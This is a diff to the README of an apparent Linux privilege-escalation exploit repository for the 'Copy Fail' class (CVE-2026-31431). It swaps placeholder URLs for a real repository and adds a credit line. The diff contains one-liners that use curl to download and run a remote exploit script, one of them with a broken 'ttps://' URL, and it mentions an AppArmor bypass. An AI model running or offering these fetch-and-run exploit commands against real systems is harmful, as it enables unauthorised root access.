@@ -31,7 +31,7 @@ This repo provides two variants. Both produce the same result; pick based on you
 
 ```bash
 # One-liner via pipe
-python3 -c "$(curl -sL https://raw.githubusercontent.com/youruser/yourrepo/main/exploit.py)"
+python3 -c "$(curl -sL https://raw.githubusercontent.com/guiimoraes/copyfail2-dirtyfrag-py/main/exploit.py)"
 
 # Saved file
 python3 exploit.py
@@ -50,7 +50,7 @@ python3 exploit_raw.py --clean
 On Ubuntu with `apparmor_restrict_unprivileged_userns` enabled, save the file first and run from disk; the pipe mode skips the AppArmor bypass dance.
 
 ```bash
-curl -sL https://raw.githubusercontent.com/youruser/yourrepo/main/exploit.py > /tmp/x.py
+curl -sL ttps://raw.githubusercontent.com/guiimoraes/copyfail2-dirtyfrag-py/main/exploit.py > /tmp/x.py
 python3 /tmp/x.py
 ```
 
@@ -94,7 +94,7 @@ If running inside Docker, start the container with `--privileged` or `--cap-add=
 - Brad Spengler / grsecurity — coined "copyfail-class"
 - Theori / Xint — original Copy Fail (CVE-2026-31431)
 - Original C exploit by 0xdeadbeefnetwork
-
+- Python exploit by guiimoraes
 ## Disclaimer
 
 This tool is provided for authorized security research and educational purposes only. Do not use against systems you do not own or have explicit permission to test. The authors assume no liability for misuse or damage caused by this software.
